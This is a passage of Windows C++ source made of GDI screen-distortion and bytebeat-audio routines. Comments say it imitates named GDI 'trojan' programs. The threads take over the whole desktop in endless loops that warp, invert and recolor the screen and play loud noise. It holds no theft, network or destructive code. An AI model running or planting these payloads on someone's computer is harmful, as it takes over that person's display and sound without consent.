		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hcdc, 0, 0, w / 10 * 9, h, hcdc, w / 10, 0, SRCCOPY);
		BitBlt(hcdc, w / 10 * 9, 0, w / 10, h, hcdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(10);
	}
}
DWORD WINAPI screenrotate(LPVOID lpParam) {
	RECT rect;
	POINT lpt[3];
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		GetWindowRect(GetDesktopWindow(), &rect);
		int counter = 30;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + counter;
			lpt[0].y = rect.top - counter;
			lpt[1].x = rect.right + counter;
			lpt[1].y = rect.top + counter;
			lpt[2].x = rect.left - counter;
			lpt[2].y = rect.bottom - counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - counter;
			lpt[0].y = rect.top + counter;
			lpt[1].x = rect.right - counter;
			lpt[1].y = rect.top - counter;
			lpt[2].x = rect.left + counter;
			lpt[2].y = rect.bottom + counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCAND);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI anyblt1(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetWindowDC(0);
	while (true)
	{
		DWORD ROP[12] = { SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE,MERGECOPY,MERGEPAINT,PATPAINT,PATINVERT,DSTINVERT };
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		DeleteObject;
		Sleep(50);
	}
}
DWORD WINAPI anyblt2(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		POINT point[3];
		point[0].x = rand() % w, point[0].y = rand() % h;
		point[1].x = rand() % w, point[1].y = rand() % h;
		point[2].x = rand() % w, point[2].y = rand() % h;
		PlgBlt(hdc, point, hdc, rand() % w, rand() % h, rand() % w, rand() % h, NULL, 0, 0);
		DeleteObject(point);
		Sleep(50);
	}
}
DWORD WINAPI blur1(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rand() % w; wPt[0].y = rand() % h;
		wPt[1].x = rand() % w; wPt[1].y = rand() % h;
		wPt[2].x = rand() % w; wPt[2].y = rand() % h;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
DWORD WINAPI screenHue(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(RGB(15, 5, 10)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * pow(x * y, (1.0 / 3.0)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI shader2(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	SetStretchBltMode(hdcCopy, HALFTONE);
	SetStretchBltMode(hdc, HALFTONE);

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int cx = abs(x - (w / 2));
				int cy = abs(y - (h / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) - (zy + i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .1f)
				{
					hslcolor.l += .1f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpParam) //credits to MazeIcon
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				double fractalX = (2.5f / w);
				double fractalY = (1.90f / h);

				double cx = x * fractalX - 2.f;
				double cy = y * fractalY - 0.95f;

				double zx = 0;
				double zy = 0;

				int fx = 0;

				while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
				{
					double fczx = zx * zx - zy * zy + cx;
					double fczy = 3 * zx * zy + cy;

					zx = fczx;
					zy = fczy;
					fx++;

					rgbquadCopy = rgbquad[index];

					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
					hslcolor.s = 0.5f;
					hslcolor.l = 0.3f;
					rgbquad[index] = Colors::hsl2rgb(hslcolor);
				}
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpParam) {//credits to Excution0x00
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	while (true)
	{
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			int average = round((float)(rgbtriple[i].rgbtBlue + rgbtriple[i].rgbtRed + rgbtriple[i].rgbtGreen) / 3);
			int fx = (x ^ y ^ i - 1);

			rgbtriple[i].rgbtRed ^= average ^ fx;
			rgbtriple[i].rgbtGreen = average + fx;
			rgbtriple[i].rgbtRed ^= average ^ fx;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		BitBlt(desk, rand() % 5, rand() % 5, sw, sh, deskMem, rand() % 5, rand() % 5, SRCCOPY);
		BitBlt(desk, rand() % 5, rand() % 5, rand() % sw, rand() % sh, deskMem, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}
DWORD WINAPI shader5(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((x | (i * 4)) * (y & (i * 4)) + 1);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	srand(time(NULL));
	int xxx = 0; BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++) {
			StretchBlt(hcdc, i, -2 + (rand() % 5), 1, h, hcdc, i, 0, 1, h, SRCCOPY);
		}
		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + y * w;
				double wave = sin((x + xxx) * 0.04) + cos((y + xxx) * 0.04);
				pBits[index].rgbRed += (256 * sin(wave) * 0.6);
				pBits[index].rgbGreen += (256 * cos(wave) * 0.6);
				pBits[index].rgbBlue += (256 * sin(wave) * 0.6);
			}
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); xxx += 4;
	}
}
DWORD WINAPI last(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); RGBQUAD* data = (RGBQUAD*)MyMemoryAddress;
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCERASE);
		GetBitmapBits(hBitmap, w * h * 4, data);
		int v = 0; BYTE byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			v = rand() % 114; *((BYTE*)data + 4 * i + v) -= 1;
		}
		SetBitmapBits(hBitmap, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
		Sleep(1);
	}
}
VOID WINAPI bytebeat1() {//ksdcbrctys.exe like
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * 2 >> (t * "7891pm"[t >> 12 & 2] * (t >> 9 | 9) >> 4) ^ (t | 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((78 * t | (t >> 91) + (91 - (t >> 13 & 13)) * t >> (t >> 78) ^ (t << 91)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 12345, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 78 | t >> 91) & 46 & t >> 78 ^ (t & t >> 13 | t >> 6) & t) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(13) + ((t & 91) * (t >> 7) ^ t & t >> 8) / 2);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t + (t ^ (t & t * (t >> 9 | 9) << 1) | (7891 + t)) ^ (t + 1)) / ((4 ^ t >> 12) + 1) & 6765));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t >> t + t | t * t & t ^ t / (t + 1) | (3 * t) - t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 13333, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 7 & 8 + (t & (t >> 9) | (t >> 1) & 7 + (t >> 8))) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 10000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((t | (t >> 9 | t >> 7)) * t & (t >> 11 | t >> 9)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//neurozine.exe like
	int nSamplesPerSec = 11000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) | (t & t >> 5) & (t ^ t << 4) + (t * t >> 7)) & 675));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {//hatsunium.exe like
